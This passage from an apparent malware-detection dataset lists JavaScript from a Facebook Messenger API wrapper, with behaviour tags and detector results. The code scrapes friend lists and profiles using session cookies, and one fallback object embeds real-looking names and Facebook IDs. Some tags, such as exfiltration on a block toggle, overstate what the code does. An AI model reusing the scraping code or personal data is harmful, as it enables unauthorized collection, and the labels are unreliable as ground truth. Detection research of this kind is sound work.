                if (process.env.HalzionVersion == 1973 && global.Fca.Data.PremText.includes("Premium")) {
                    return Method[Name](args).then((/** @type {string} */Data) => {
                        return Data;
                    })
                }
                else {
                    return ("Mua Premium Đi Rồi Sài Ông Cháu Ơi !!");
                }
            }
            catch (e) {
                console.log(e);
            }
        }
    }    
};
```

**形式化行为：** arbitrary_command_execution, dynamic_evaluation, unauthorized_access

**形式化规避：** built_in_module_abuse, conditional_execution, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 23

**文件：** `package/getThreadPictures.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs repeated HTTP POSTs, collects image data from Facebook, and processes complex response structures.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function getThreadPictures(threadID, offset, limit, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, data) {
        if (err) return rejectFunc(err);
        resolveFunc(data);
      };
    }

    var form = {
      thread_id: threadID,
      offset: offset,
      limit: limit
    };

    defaultFuncs
      .post("https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return Promise.all(
          resData.payload.imagesData.map(function (image) {
            form = {
              thread_id: threadID,
              image_id: image.fbid
            };
            return defaultFuncs
              .post("https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php", ctx.jar, form)
              .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
              .then(function (resData) {
                if (resData.error) throw resData;
                // the response is pretty messy
                var queryThreadID = resData.jsmods.require[0][3][1].query_metadata.query_path[0].message_thread;
                var imageData = resData.jsmods.require[0][3][1].query_results[queryThreadID].message_images.edges[0].node.image2;
                return imageData;
              });
          })
        );
      })
      .then(resData => callback(null, resData))
      .catch(function (err) {
        log.error("Error in getThreadPictures", err);
        callback(err);
      });
    return returnPromise;
  };
};

```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse, data_exfiltration, unauthorized_access

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 24

**文件：** `package/changeAvt.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Downloads image from URL and uploads it to Facebook profile, enabling remote profile picture changes.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

async function postImage(Api,BotID,form) {
    var Data = await Api.httpPostFormData(`https://www.facebook.com/profile/picture/upload/?profile_id=${BotID}&photo_source=57&av=${BotID}`, form);
    return JSON.parse(Data.split("for (;;);[")[1]);
}

module.exports = function(defaultFuncs, api, ctx) {
    return function changeAvt(link, caption, callback) {
        var resolveFunc = function() {};
        var rejectFunc = function() {};
        var returnPromise = new Promise(function(resolve, reject) {
            resolveFunc = resolve;
            rejectFunc = reject;
        });

        if (!callback) {
            callback = function(err, data) {
                if (err) return rejectFunc(err);
                resolveFunc(data);
            };
        }
        try {
            var Fetch = require('axios')
            Fetch.get(link, { responseType: "stream" }).then(data => { 
                postImage(api, ctx.userID, { file: data.data }).then(data => {
                    if (data.error) throw new Error({ error: data.error, des: data.error.errorDescription });
                    var form = {
                        av: ctx.userID,
                            fb_api_req_friendly_name: "ProfileCometProfilePictureSetMutation",
                            fb_api_caller_class: "RelayModern",
                            doc_id: "5066134240065849",
                            variables: JSON.stringify({
                                input: {
                                    caption: (caption || ""),
                                    existing_photo_id: data.payload.fbid,
                                    expiration_time: null,
                                    profile_id: ctx.userID,
                                    profile_pic_method: "EXISTING",
                                    profile_pic_source: "TIMELINE",
                                scaled_crop_rect: {
                                    height: 1,
                                    width: 1,
                                    x: 0,
                                    y: 0
                                },
                                skip_cropping: true,
                                actor_id: ctx.userID,
                                client_mutation_id: Math.round(Math.random() * 19).toString()
                                },
                            isPage: false,
                            isProfile: true,
                            scale: 3,
                        })
                    };
                    defaultFuncs
                        .post("https://www.facebook.com/api/graphql/", ctx.jar, form)
                        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
                        .then(function(resData) {
                            if (resData.error) throw resData;
                            else return callback(null,true)
                        })
                        .catch(function(err) {
                        return callback(err);
                    });
                })
            })  
        }
        catch (e) {
            throw e;
        }
        return returnPromise;
    };
};
```

**形式化行为：** legitimate_api_abuse, unauthorized_access, malicious_download

**形式化规避：** legitimate_api_abuse, silent_error_handling, built_in_module_abuse, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 25

**文件：** `package/getUserInfoV2.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Dynamically loads external module and calls getInfo with user/context, risking data exfiltration or hidden network activity.

**规避技术：** 

**恶意代码：**
```javascript
var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
    return function getUserInfoV2(id, callback) {
      var resolveFunc = function () { };
      var rejectFunc = function () { };
      var returnPromise = new Promise(function (resolve, reject) {
        resolveFunc = resolve;
        rejectFunc = reject;
      });
  
      if (!callback) {
        callback = function (err, userInfo) {
          if (err) return rejectFunc(err);
          resolveFunc(userInfo);
        };
      }
    try {
      var { getInfo } = require('../Extra/ExtraAddons');
      getInfo(id,ctx.jar,ctx,defaultFuncs)
        .then(data => {
        return callback(null, data);
      });
    }
    catch (e) {
      return callback(null, e);
    }
    return returnPromise;
    };
  };
```

**形式化行为：** sensitive_data_collection, data_exfiltration, unauthorized_access

**形式化规避：** dynamic_evaluation, silent_error_handling, code_splitting

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 26

**文件：** `package/getThreadInfo.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Periodically sends user thread info to Facebook, stores user data globally, and uses external modules for data handling.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");
// ... [truncated for brevity] ...
module.exports = function(defaultFuncs, api, ctx) {

  var { createData,getData,hasData,alreadyUpdate,setLastRun,updateData, getAll } = require('../Extra/ExtraGetThread');
  var { capture } = require('../Extra/Src/Last-Run');
  global.Fca.Data.Userinfo = []
  
  return function getThreadInfoGraphQL(threadID, callback) {
    var resolveFunc = function(){};
    var rejectFunc = function(){};
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (utils.getType(callback) != "Function" && utils.getType(callback) != "AsyncFunction") {
      callback = function (err, data) {
        if (err) {
          return rejectFunc(err);
        }
        resolveFunc(data);
      };
    }

      // ... [truncated for brevity] ...
      if (utils.getType(threadID) !== "Array") threadID = [threadID];

    var SpecialMethod = function(TID) {
      var All = getAll();
      var AllofThread = []
      if (All.length < 1) {
        return DefaultMethod(TID);
      } else if (All.length > 1) {
        for (let i of All) {
            if (i.data.threadID != undefined) {
              AllofThread.push(i.data.threadID);
            } else continue;
        }
        var Form = {}
        var ThreadInfo = [];
  
        AllofThread.map(function (x,y) {
          Form["o" + y] = {
            doc_id: "3449967031715030",
            query_params: {
              id: x,
              message_limit: 0,
              load_messages: false,
              load_read_receipts: false,
              before: null
            }
          };
        });
  
        var form = {
          queries: JSON.stringify(Form),
          batch_name: "MessengerGraphQLThreadFetcher"
        };
  
        defaultFuncs
        .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
          .then(function(resData) {
          if (resData.error) {
            throw "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều"
          }
          if (resData[resData.length - 1].error_results !== 0) {
            throw "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều"
          }
          resData = resData.splice(0, resData.length - 1);
          resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });
          resData.map(function (x,y) {
            ThreadInfo.push(formatThreadGraphQLResponse(x["o"+y].data));
          });
          global.Fca.Data.Userinfo = []
          if (process.env.HalzionVersion == 1973) {
            if (Object.keys(resData).length == 1) {
              updateData(threadID,ThreadInfo[0]);	
              global.Fca.Data.Userinfo.push(ThreadInfo[0].userInfo);
            } else {
              for (let i of ThreadInfo) {
                updateData(i.threadID,i);
                global.Fca.Data.Userinfo.push(i.userInfo);
              }
            }
          }
        })
        .catch(function(err){
          throw "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều"
        });
      }
    }
    var DefaultMethod = function(TID) { 
      var ThreadInfo = [];
      for (let i of TID) {
        ThreadInfo.push(getData(i));
      }
      if (ThreadInfo.length == 1) {
        callback(null,ThreadInfo[0]);
        global.Fca.Data.Userinfo.push(ThreadInfo[0].userInfo);
      } else {
        for (let i of ThreadInfo) {
          global.Fca.Data.Userinfo.push(i.userInfo);
        }
        callback(null,ThreadInfo);
      }
    }
    var CreateMethod = function(TID) { 
      var Form = {}
      var ThreadInfo = [];

      TID.map(function (x,y) {
        Form["o" + y] = {
          doc_id: "3449967031715030",
          query_params: {
            id: x,
            message_limit: 0,
            load_messages: false,
            load_read_receipts: false,
            before: null
          }
        };
      });

      var form = {
        queries: JSON.stringify(Form),
        batch_name: "MessengerGraphQLThreadFetcher"
      };

      defaultFuncs
      .post("https://www.facebook.com/api/graphqlbatch/", ctx.jar, form)
        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
        .then(function(resData) {
        if (resData.error) {
          callback(null,{threadID:"5011501735554963",threadName:"TempThreadInfo",participantIDs:["100042817150429","100077059530660"],userInfo:[{id:"100042817150429",name:"Nguyễn Th\xe1i Hảo",firstName:"Hảo",vanity:"Lazic.Kanzu",thumbSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",profileUrl:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",gender:"MALE",type:"User",isFriend:!0,isBirthday:!1},{id:"100077059530660",name:"Lucius Hori",firstName:"Lucius",vanity:"Horizon.Lucius.Synthesis.III",thumbSrc:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",profileUrl:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",gender:"MALE",type:"User",isFriend:!1,isBirthday:!1}],unreadCount:38357,messageCount:39288,timestamp:"1668862170994",muteUntil:null,isGroup:!0,isSubscribed:!0,isArchived:!1,folder:"INBOX",cannotReplyReason:null,eventReminders:[],emoji:"\uD83D\uDE0F",color:"DD8800",nicknames:{"100042817150429":"Bla bla"},adminIDs:[{id:"100042817150429"}],approvalMode:!0,approvalQueue:[],reactionsMuteMode:"reactions_not_muted",mentionsMuteMode:"mentions_not_muted",isPinProtected:!1,relatedPageThread:null,name:"Temp ThreadInfo GraphQL",snippet:"/getthreadtest",snippetSender:"100042817150429",snippetAttachments:[],serverTimestamp:"1668862170994",imageSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=kOr9K5TWwDMAX-4qPH1&_nc_ht=scontent.fsgn5-10.fna&oh=03_AdRQSwLyIGJ-zrgyQj1IIQAFO3IC-4_Qq_qMd58ZtMCI0A&oe=63A02D7A",isCanonicalUser:!1,isCanonical:!1,recipientsLoadable:!0,hasEmailParticipant:!1,readOnly:!1,canReply:!0,lastMessageType:"message",lastReadTimestamp:"1649756873571",threadType:2,TimeCreate:1668862173440,TimeUpdate:1668862173440});
          throw "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều, Thay thế bằng temp threadInfo =)) !"
        }
        if (resData[resData.length - 1].error_results !== 0) {
          callback(null,{threadID:"5011501735554963",threadName:"TempThreadInfo",participantIDs:["100042817150429","100077059530660"],userInfo:[{id:"100042817150429",name:"Nguyễn Th\xe1i Hảo",firstName:"Hảo",vanity:"Lazic.Kanzu",thumbSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",profileUrl:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",gender:"MALE",type:"User",isFriend:!0,isBirthday:!1},{id:"100077059530660",name:"Lucius Hori",firstName:"Lucius",vanity:"Horizon.Lucius.Synthesis.III",thumbSrc:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",profileUrl:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",gender:"MALE",type:"User",isFriend:!1,isBirthday:!1}],unreadCount:38357,messageCount:39288,timestamp:"1668862170994",muteUntil:null,isGroup:!0,isSubscribed:!0,isArchived:!1,folder:"INBOX",cannotReplyReason:null,eventReminders:[],emoji:"\uD83D\uDE0F",color:"DD8800",nicknames:{"100042817150429":"Bla bla"},adminIDs:[{id:"100042817150429"}],approvalMode:!0,approvalQueue:[],reactionsMuteMode:"reactions_not_muted",mentionsMuteMode:"mentions_not_muted",isPinProtected:!1,relatedPageThread:null,name:"Temp ThreadInfo GraphQL",snippet:"/getthreadtest",snippetSender:"100042817150429",snippetAttachments:[],serverTimestamp:"1668862170994",imageSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=kOr9K5TWwDMAX-4qPH1&_nc_ht=scontent.fsgn5-10.fna&oh=03_AdRQSwLyIGJ-zrgyQj1IIQAFO3IC-4_Qq_qMd58ZtMCI0A&oe=63A02D7A",isCanonicalUser:!1,isCanonical:!1,recipientsLoadable:!0,hasEmailParticipant:!1,readOnly:!1,canReply:!0,lastMessageType:"message",lastReadTimestamp:"1649756873571",threadType:2,TimeCreate:1668862173440,TimeUpdate:1668862173440});
          throw "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều, Thay thế bằng temp threadInfo =)) !"
        }
        resData = resData.splice(0, resData.length - 1);
        resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });
        resData.map(function (x,y) {
          ThreadInfo.push(formatThreadGraphQLResponse(x["o"+y].data));
        });
        if (process.env.HalzionVersion == 1973) {
          if (Object.keys(resData).length == 1) {
            createData(threadID,ThreadInfo[0]);	
            callback(null, ThreadInfo[0]);
            capture(callback);
            setLastRun('LastUpdate', callback);
          } else {
            for (let i of ThreadInfo) {
              createData(i.threadID,i);
              global.Fca.Data.Userinfo.push(i.userInfo);
            }
            callback(null, ThreadInfo);
          }
        }
          else {
            callback(null, ThreadInfo[0]);
            global.Fca.Data.Userinfo.push(ThreadInfo[0].userInfo);
          }
      })
      .catch(function(err){
        callback(null,{threadID:"5011501735554963",threadName:"TempThreadInfo",participantIDs:["100042817150429","100077059530660"],userInfo:[{id:"100042817150429",name:"Nguyễn Th\xe1i Hảo",firstName:"Hảo",vanity:"Lazic.Kanzu",thumbSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",profileUrl:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t39.30808-1/311136459_774539707316594_357342861145224378_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=101&ccb=1-7&_nc_sid=f67be1&_nc_ohc=0y9pN1XSiVIAX8HS5P6&_nc_ht=scontent.fsgn5-10.fna&oh=00_AfCBYmeKDgLZLWDMRBmBZj8zRLboVA096bkbsC4a1Q0DUQ&oe=637E5939",gender:"MALE",type:"User",isFriend:!0,isBirthday:!1},{id:"100077059530660",name:"Lucius Hori",firstName:"Lucius",vanity:"Horizon.Lucius.Synthesis.III",thumbSrc:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",profileUrl:"https://scontent.fsgn5-3.fna.fbcdn.net/v/t39.30808-1/309709623_179304871314830_1479186956574752444_n.jpg?stp=cp0_dst-jpg_p60x60&_nc_cat=104&ccb=1-7&_nc_sid=7206a8&_nc_ohc=rXiLw0_ID7MAX-q4wYv&_nc_ht=scontent.fsgn5-3.fna&oh=00_AfD8Wl_EQLLBCZOWxmBdcIP9Nc1iyLQY9qsMTIN4Sf5H8w&oe=637D35E0",gender:"MALE",type:"User",isFriend:!1,isBirthday:!1}],unreadCount:38357,messageCount:39288,timestamp:"1668862170994",muteUntil:null,isGroup:!0,isSubscribed:!0,isArchived:!1,folder:"INBOX",cannotReplyReason:null,eventReminders:[],emoji:"\uD83D\uDE0F",color:"DD8800",nicknames:{"100042817150429":"Bla bla"},adminIDs:[{id:"100042817150429"}],approvalMode:!0,approvalQueue:[],reactionsMuteMode:"reactions_not_muted",mentionsMuteMode:"mentions_not_muted",isPinProtected:!1,relatedPageThread:null,name:"Temp ThreadInfo GraphQL",snippet:"/getthreadtest",snippetSender:"100042817150429",snippetAttachments:[],serverTimestamp:"1668862170994",imageSrc:"https://scontent.fsgn5-10.fna.fbcdn.net/v/t1.15752-9/278020824_345766417524223_6790288127531819759_n.jpg?_nc_cat=101&ccb=1-7&_nc_sid=02e273&_nc_ohc=kOr9K5TWwDMAX-4qPH1&_nc_ht=scontent.fsgn5-10.fna&oh=03_AdRQSwLyIGJ-zrgyQj1IIQAFO3IC-4_Qq_qMd58ZtMCI0A&oe=63A02D7A",isCanonicalUser:!1,isCanonical:!1,recipientsLoadable:!0,hasEmailParticipant:!1,readOnly:!1,canReply:!0,lastMessageType:"message",lastReadTimestamp:"1649756873571",threadType:2,TimeCreate:1668862173440,TimeUpdate:1668862173440});
        throw "Lỗi: getThreadInfoGraphQL Có Thể Do Bạn Spam Quá Nhiều, Thay thế bằng temp threadInfo =)) !"
      });
    }
    if (global.Fca.Data.Already != true) SpecialMethod(threadID); 
    global.Fca.Data.Already = true;

    setInterval(function(){
      SpecialMethod(threadID);
    }, 900 * 1000);

    for (let i of threadID) {
      switch (hasData(i)) {
          case true: {     
            DefaultMethod(threadID);
            break;
          }
        case false: {
          CreateMethod(threadID);
          break;
        }
      }
    }
    return returnPromise;
  }
};
// ... [truncated for brevity] ...
```

**形式化行为：** sensitive_data_collection, data_exfiltration, legitimate_api_abuse, runtime_caching

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 27

**文件：** `package/changeBlockedStatus.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST requests to Facebook, potentially changing user block status; transmits user IDs and session cookies.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

module.exports = function (defaultFuncs, api, ctx) {
  return function changeBlockedStatus(userID, block, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err) {
        if (err) return rejectFunc(err);
        resolveFunc();
      };
    }

    defaultFuncs
      .post(`https://www.facebook.com/messaging/${block ? "" : "un"}block_messages/`, ctx.jar, { fbid: userID })
      .then(utils.saveCookies(ctx.jar))
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback();
      })
      .catch(function (err) {
        log.error("changeBlockedStatus", err);
        return callback(err);
      });
    return returnPromise;
  };
};

```

**形式化行为：** legitimate_api_abuse, unauthorized_access, data_exfiltration

**形式化规避：** built_in_module_abuse, legitimate_api_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 28

**文件：** `package/getFriendsList.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Collects and transmits Facebook user data via HTTP POST; could be used for unauthorized data scraping or exfiltration.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

// [almost] copy pasted from one of FB's minified file (GenderConst)
var GENDERS = {
  0: "unknown",
  1: "female_singular",
  2: "male_singular",
  3: "female_singular_guess",
  4: "male_singular_guess",
  5: "mixed",
  6: "neuter_singular",
  7: "unknown_singular",
  8: "female_plural",
  9: "male_plural",
  10: "neuter_plural",
  11: "unknown_plural"
};

function formatData(obj) {
  return Object.keys(obj).map(function (key) {
    var user = obj[key];
    return {
      alternateName: user.alternateName,
      firstName: user.firstName,
      gender: GENDERS[user.gender],
      userID: utils.formatID(user.id.toString()),
      isFriend: user.is_friend != null && user.is_friend ? true : false,
      fullName: user.name,
      profilePicture: user.thumbSrc,
      type: user.type,
      profileUrl: user.uri,
      vanity: user.vanity,
      isBirthday: !!user.is_birthday
    };
  });
}

module.exports = function (defaultFuncs, api, ctx) {
  return function getFriendsList(callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, friendList) {
        if (err) return rejectFunc(err);
        resolveFunc(friendList);
      };
    }

    defaultFuncs
      .postFormData("https://www.facebook.com/chat/user_info_all", ctx.jar, {}, { viewer: ctx.userID })
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (!resData) throw { error: "getFriendsList returned empty object." };
        if (resData.error) throw resData;
        callback(null, formatData(resData.payload));
      })
      .catch(function (err) {
        log.error("getFriendsList", "Lỗi getFriendsList Có Thể Do Bạn Spam Quá Nhiều ! Hãy Hạn Chế !");
        return callback(err);
      });

    return returnPromise;
  };
};

```

**形式化行为：** sensitive_data_collection, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, silent_error_handling, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 29

**文件：** `package/getUserInfoMain.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP POST to Facebook, collects user info, and processes profile data; could be used for data scraping.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

function formatData(data) {
  var retObj = {};

  for (var prop in data) {
    // eslint-disable-next-line no-prototype-builtins
    if (data.hasOwnProperty(prop)) {
      var innerObj = data[prop];
      retObj[prop] = {
        name: innerObj.name,
        firstName: innerObj.firstName,
        vanity: innerObj.vanity,
        thumbSrc: innerObj.thumbSrc,
        profileUrl: innerObj.uri,
        gender: innerObj.gender,
        type: innerObj.type,
        isFriend: innerObj.is_friend,
        isBirthday: !!innerObj.is_birthday
      };
    }
  }

  return retObj;
}

module.exports = function (defaultFuncs, api, ctx) {
  return function getUserInfo(id, callback) {
    var resolveFunc = function () { };
    var rejectFunc = function () { };
    var returnPromise = new Promise(function (resolve, reject) {
      resolveFunc = resolve;
      rejectFunc = reject;
    });

    if (!callback) {
      callback = function (err, userInfo) {
        if (err) return rejectFunc(err);
        resolveFunc(userInfo);
      };
    }

    if (utils.getType(id) !== "Array") id = [id];

    var form = {};
    id.map(function (v, i) {
      form["ids[" + i + "]"] = v;
    });
    defaultFuncs
      .post("https://www.facebook.com/chat/user_info/", ctx.jar, form)
      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))
      .then(function (resData) {
        if (resData.error) throw resData;
        return callback(null, formatData(resData.payload.profiles));
      })
      .catch(function (err) {
        log.error("getUserInfo", "Lỗi: getUserInfo Có Thể Do Bạn Spam Quá Nhiều !,Hãy Thử Lại !");
        return callback(err);
      });
    return returnPromise;
  };
};
```

**形式化行为：** sensitive_data_collection, data_exfiltration, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 30

